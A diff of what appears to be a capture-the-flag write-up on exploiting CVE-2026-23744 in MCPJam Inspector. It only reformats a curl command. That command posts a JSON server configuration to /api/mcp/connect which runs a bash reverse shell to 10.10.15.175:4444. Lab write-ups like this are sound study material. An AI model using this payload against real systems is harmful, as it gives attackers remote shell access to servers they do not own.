@@ -8,11 +8,9 @@
 	Vulnerability Analysis: Identifying an outdated version of MCPJam Inspector on `mcp.kobold.htb`.
     CVE-2026-23744: Exploiting a critical vulnerability in the MCP API to achieve Remote Code Execution (RCE).
     Payload Delivery: Utilizing `curl` to inject a malicious JSON configuration into the `/api/mcp/connect` endpoint.
-	`
-	curl -k https://mcp.kobold.htb:443/api/mcp/connect \
+	`curl -k https://mcp.kobold.htb:443/api/mcp/connect \
 	--header "Content-Type: application/json" \
-	--data '{"serverConfig":{"command":"/bin/bash","args":["-c", "bash -i >& /dev/tcp/10.10.15.175/4444 0>&1"],"env":{}},"serverId":"rev_shell"}'
-	`
+	--data '{"serverConfig":{"command":"/bin/bash","args":["-c", "bash -i >& /dev/tcp/10.10.15.175/4444 0>&1"],"env":{}},"serverId":"rev_shell"}'`
     Reverse Shell: Establishing a callback to `10.10.15.175:4444` via a bash interactive shell.
     
 ## Persistence and Stabilization
